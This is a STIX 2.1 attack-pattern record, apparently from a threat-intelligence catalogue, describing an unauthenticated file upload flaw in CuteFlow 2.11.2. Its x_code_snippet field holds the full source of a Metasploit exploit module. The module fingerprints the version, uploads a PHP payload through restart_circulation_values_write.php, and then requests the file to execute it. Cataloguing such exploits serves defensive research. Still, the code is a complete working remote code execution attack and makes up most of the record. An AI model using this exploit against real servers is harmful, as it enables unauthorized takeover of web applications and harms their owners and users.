{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f1750666-6b54-410f-8859-b88d237666dd",
    "created": "2024-08-14T17:08:09.82938Z",
    "modified": "2024-08-14T17:08:09.829384Z",
    "name": "\"CuteFlow v2.11.2 Arbitrary File Upload Vulnerability\"",
    "description": " This module exploits a vulnerability in CuteFlow version 2.11.2 or prior. This application has an upload feature that allows an unauthenticated user to upload arbitrary files to the 'upload/___1/' directory and then execute it.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/cuteflow_upload_exec.rb",
            "external_id": "cuteflow_upload_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "http://itsecuritysolutions.org/2012-07-01-CuteFlow-2.11.2-multiple-security-vulnerabilities/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"CuteFlow v2.11.2 Arbitrary File Upload Vulnerability\",\n      'Description'    => %q{\n        This module exploits a vulnerability in CuteFlow version 2.11.2 or prior.\n        This application has an upload feature that allows an unauthenticated\n        user to upload arbitrary files to the 'upload/___1/' directory\n        and then execute it.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'bcoles' # Discovery and exploit\n        ],\n      'References'     =>\n        [\n          ['URL', 'http://itsecuritysolutions.org/2012-07-01-CuteFlow-2.11.2-multiple-security-vulnerabilities/'],\n          ['OSVDB', '84829'],\n          #['EDB',   ''],\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\"\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'thread'\n        },\n      'Platform'       => 'php',\n      'Arch'           => ARCH_PHP,\n      'Targets'        =>\n        [\n          ['Automatic Targeting', { 'auto' => true }]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-07-27',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The path to the web application', '/cuteflow_v.2.11.2/'])\n      ])\n  end\n\n  def check\n\n    base  = normalize_uri(target_uri.path)\n    base << '/' if base[-1, 1] != '/'\n    res = send_request_raw({\n      'method' => 'GET',\n      'uri'    => base\n    })\n\n    if res.body =~ /\\<strong style\\=\\\"font\\-size\\:8pt\\;font\\-weight\\:normal\\\"\\>Version 2\\.11\\.2\\<\\/strong\\>\\<br\\>/\n      return Exploit::CheckCode::Appears\n    elsif res.body =~ /\\<a href\\=\\\"http\\:\\/\\/cuteflow\\.org\" target\\=\\\"\\_blank\\\"\\>/\n      return Exploit::CheckCode::Detected\n    else\n      return Exploit::CheckCode::Safe\n    end\n\n  end\n\n  def upload(base, fname, file)\n\n    # construct post data\n    boundary = \"----WebKitFormBoundary#{rand_text_alphanumeric(10)}\"\n    data_post  = \"--#{boundary}\\r\\n\"\n    data_post << \"Content-Disposition: form-data; name=\\\"attachment1\\\"; filename=\\\"#{fname}\\\"\\r\\n\"\n    data_post << \"Content-Type: text/php\\r\\n\"\n    data_post << \"\\r\\n\"\n    data_post << file\n    data_post << \"\\r\\n\"\n    data_post << \"--#{boundary}\\r\\n\"\n\n    # upload\n    res = send_request_cgi({\n      'method'  => 'POST',\n      'uri'     => normalize_uri(base, \"pages/restart_circulation_values_write.php\"),\n      'ctype'   => \"multipart/form-data; boundary=#{boundary}\",\n      'data'    => data_post,\n    })\n\n    return res\n  end\n\n  def exploit\n    base  = normalize_uri(target_uri.path)\n    base << '/' if base[-1, 1] != '/'\n\n    # upload PHP payload to upload/___1/\n    print_status(\"Uploading PHP payload (#{payload.encoded.length.to_s} bytes)\")\n    fname = rand_text_alphanumeric(rand(10)+6) + '.php'\n    php   = %Q|<?php #{payload.encoded} ?>|\n    res   = upload(base, fname, php)\n    if res.nil?\n      print_error(\"Uploading PHP payload failed\")\n      return\n    end\n\n    # retrieve and execute PHP payload\n    print_status(\"Retrieving file: #{fname}\")\n    send_request_raw({\n      'method' => 'GET',\n      'uri'    => normalize_uri(base, \"upload/___1/#{fname}\")\n    })\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-07-27",
    "x_mitre_platforms": [
        "php'"
    ]
}